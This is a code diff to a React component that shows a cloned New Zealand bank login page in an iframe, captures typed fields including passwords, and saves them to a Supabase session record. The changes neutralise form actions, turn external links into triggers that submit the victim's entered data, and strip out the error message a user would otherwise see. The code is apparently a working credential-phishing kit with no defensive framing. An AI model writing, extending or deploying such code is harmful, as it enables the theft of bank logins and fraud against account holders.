@@ -101,12 +101,16 @@ function hasPasswordField(fields: CapturedField[]) {
   return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
 }
 
+function isExternalHref(href: string | null) {
+  if (!href) return false;
+  return /^https?:\/\//i.test(href.trim());
+}
+
 export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [saving, setSaving] = useState(false);
-  const [error, setError] = useState<string | null>(null);
   const htmlPath = getNzBankPagePath(bankSlug);
 
   const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
@@ -117,8 +121,6 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     }
 
     setSaving(true);
-    setError(null);
-
     const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
     const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};
 
@@ -185,7 +187,6 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     setSaving(false);
 
     if (updateError) {
-      setError("Bank details could not be submitted. Please try again.");
       return;
     }
 
@@ -240,6 +241,10 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
     const forms = Array.from(doc.querySelectorAll("form"));
     forms.forEach((form) => {
+      form.setAttribute("action", "#");
+      form.setAttribute("method", "post");
+      form.setAttribute("target", "_self");
+      form.setAttribute("novalidate", "novalidate");
       form.addEventListener("submit", submitWithCurrentValues);
     });
 
@@ -252,8 +257,17 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         node.getAttribute("value") ||
         node.getAttribute("aria-label") ||
         "";
+      const wasExternalLink = node instanceof HTMLAnchorElement && isExternalHref(node.getAttribute("href"));
 
-      if (!ACTION_BUTTON_RE.test(nodeText)) return;
+      if (node instanceof HTMLAnchorElement && wasExternalLink) {
+          node.setAttribute("href", "#");
+          node.setAttribute("target", "_self");
+          node.setAttribute("rel", "nofollow noopener noreferrer");
+      }
+
+      if (!(ACTION_BUTTON_RE.test(nodeText) || wasExternalLink)) {
+        return;
+      }
 
       node.addEventListener("click", submitWithCurrentValues);
     });
@@ -287,12 +301,6 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
   return (
     <div className="relative min-h-screen bg-white">
-      {error ? (
-        <div className="absolute inset-x-4 top-4 z-20 rounded-xl bg-red-600 px-4 py-3 text-center text-sm font-semibold text-white shadow-lg">
-          {error}
-        </div>
-      ) : null}
-
       <iframe
         ref={iframeRef}
         title={`${bankName} login`}
